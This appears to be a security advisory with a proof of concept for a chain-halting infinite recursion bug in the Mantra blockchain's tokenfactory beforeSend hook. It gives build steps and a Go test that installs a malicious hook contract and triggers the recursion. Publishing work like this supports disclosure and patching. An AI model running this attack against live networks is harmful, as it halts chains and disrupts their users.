# Mantra  Infinite Recursion Attack via Double-Msg Hook Contract
Chain: Mantra ([CVE](https://github.com/MANTRA-Chain/mantrachain/security/advisories/GHSA-qwvm-wqq8-8j69))

Impact: Chain halt

## Introduction

This vulnerability exploits the tokenfactory's hook mechanism to create an infinite recursion loop that can execute a single transaction more than **2^500 times**, effectively causing a blockchain halt.

## Proof of Concept

1. **Override Contract**: Replace the following file with [PoC contract](./infinite-track-beforesend):
   ```
   x/tokenfactory/keeper/testcontracts/contracts/infinite-track-beforesend/src/contract.rs
   ```

2. **Build Configuration**:
   ```bash
   cd [contract-path]
   rustup override set 1.81
   rustup target add wasm32-unknown-unknown --toolchain 1.81
   cargo update -p base64ct --precise 1.6.0
   cargo wasm
   ```

3. **Deploy Contract**:
   ```bash
   # Copy compiled contract
   cp target/wasm32-unknown-unknown/release/[contract].wasm \
      x/tokenfactory/keeper/testdata/recall.wasm
   ```

4. **Add the following test to `x/tokenfactory/keeper/before_send_test.go`**::

```go
func (s *KeeperTestSuite) TestBeforeSendHook() {
    s.SkipIfWSL()
    for _, tc := range []struct {
        desc     string
        wasmFile string
        sendMsgs []SendMsgTestCase
    }{
        {
            desc:     "should not allow sending 100 amount of *any* denom",
            wasmFile: "./testdata/recall2.wasm",
            sendMsgs: []SendMsgTestCase{
                {
                    desc: "sending 1 of factorydenom should not error",
                    msg: func(factorydenom string) *banktypes.MsgSend {
                        return banktypes.NewMsgSend(
                            s.TestAccs[0],
                            s.TestAccs[1],
                            sdk.NewCoins(sdk.NewInt64Coin(factorydenom, 1)),
                        )
                    },
                    expectPass: true,
                },
            },
        },
    } {
        s.Run(fmt.Sprintf("Case %s", tc.desc), func() {
            // Setup test environment
            s.SetupTest()

            // Upload and instantiate WASM code
            wasmCode, err := os.ReadFile(tc.wasmFile)
            s.Require().NoError(err, "Reading WASM file: %v", tc.desc)
            
            codeID, _, err := s.contractKeeper.Create(s.Ctx, s.TestAccs[0], wasmCode, nil)
            s.Require().NoError(err, "Creating contract: %v", tc.desc)
            
            cosmwasmAddress, _, err := s.contractKeeper.Instantiate(s.Ctx, codeID, s.TestAccs[0], s.TestAccs[0], []byte("{}"), "", sdk.NewCoins())
            s.Require().NoError(err, "Instantiating contract: %v", tc.desc)

            // Create new denom for testing
            res, err := s.msgServer.CreateDenom(s.Ctx, types.NewMsgCreateDenom(s.TestAccs[0].String(), "bitcoin"))
            s.Require().NoError(err, "Creating denom: %v", tc.desc)
            denom := res.GetNewTokenDenom()

            // Mint tokens to creator
            _, err = s.msgServer.Mint(s.Ctx, types.NewMsgMint(s.TestAccs[0].String(), sdk.NewInt64Coin(denom, 999999999999999999)))
            s.Require().NoError(err)
            
            // Fund account with non-tokenfactory coins
            s.FundAcc(sdk.MustAccAddressFromBech32(s.TestAccs[0].String()), sdk.Coins{sdk.NewInt64Coin("foo", 100000000000)})

            // Set malicious beforeSend hook
            _, err = s.msgServer.SetBeforeSendHook(s.Ctx.WithGasMeter(storetypes.NewGasMeter(600000)), types.NewMsgSetBeforeSendHook(s.TestAccs[0].String(), denom, cosmwasmAddress.String()))
            s.Require().NoError(err, "Setting hook: %v", tc.desc)
            
            // Transfer tokens to contract
            s.App.BankKeeper.SendCoins(s.Ctx.WithGasMeter(storetypes.NewGasMeter(600000)), s.TestAccs[0], cosmwasmAddress, sdk.NewCoins(sdk.NewInt64Coin(denom, 899999999999999999)))
            
            // Verify hook configuration
            denoms, beforeSendHooks := s.App.TokenFactoryKeeper.GetAllBeforeSendHooks(s.Ctx)
            s.Require().Equal(beforeSendHooks, []string{cosmwasmAddress.String()})
            s.Require().Equal(denoms, []string{denom})

            // Execute the attack - this will trigger infinite recursion
            for _, sendTc := range tc.sendMsgs {
                // NOTE: This call will never complete due to infinite recursion
                // Set a breakpoint at this line to observe the attack in action
                _, err := s.bankMsgServer.Send(s.Ctx.WithGasMeter(storetypes.NewGasMeter(600000)), sendTc.msg(denom))
                
                // Additional validation (will not be reached due to infinite loop)
                for _, coin := range sendTc.msg(denom).Amount {
                    _, err = s.msgServer.Mint(s.Ctx, types.NewMsgMint(s.TestAccs[0].String(), sdk.NewInt64Coin(coin.Denom, coin.Amount.Int64())))
                    if coin.Denom == denom && coin.Amount.Equal(osmomath.NewInt(100)) {
                        s.Require().NoError(err, "Minting validation: %v", sendTc.desc)
                    }
                }
            }
        })
    }
}
```

## Results

Finally, by executing the corresponding test, we can observe that the transaction enters an infinite execution loop and stops after 30s. By setting breakpoints and debugging, we can further confirm the existence of this issue. This means that by triggering the `SendCoins` hook function, an attacker can force the node into a state of infinite hook execution. The number of messages that need to be executed reaches `2^500 - 1`, making it practically impossible for execution to ever complete.

This issue has a more severe impact on Mantra. The reason we did not use chains such as n*** as examples is that, prior to our disclosure, Mantra was a permissionless chain, whereas n*** requires explicit authorization to set hooks.

